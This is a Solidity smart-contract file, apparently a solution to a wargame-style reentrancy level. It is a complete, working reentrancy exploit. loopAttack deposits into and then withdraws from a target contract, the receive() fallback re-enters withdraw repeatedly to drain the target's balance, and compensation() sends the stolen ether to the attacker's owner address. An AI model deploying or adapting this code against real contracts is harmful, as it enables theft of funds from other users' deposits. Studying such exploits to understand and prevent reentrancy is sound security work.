// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint _amount) external;
}

contract ReentranceAttack {
    address public owner;
    IReentrance targetContract;
    uint targetValue = 1000000000000000;

    constructor(address _targetAddr) public {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function loopAttack() public payable {
        require(msg.value >= targetValue);
        //donate
        targetContract.donate{value: msg.value}(address(this));
        //withdraw
        targetContract.withdraw(msg.value);
        // hit receive and repeat
    }

    function compensation() public {
        require(msg.sender == owner);
        uint totalBalance = address(this).balance;
        payable(msg.sender).transfer(totalBalance);
    }

    receive() external payable {
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
            targetContract.withdraw(targetValue);
        }
    }
}
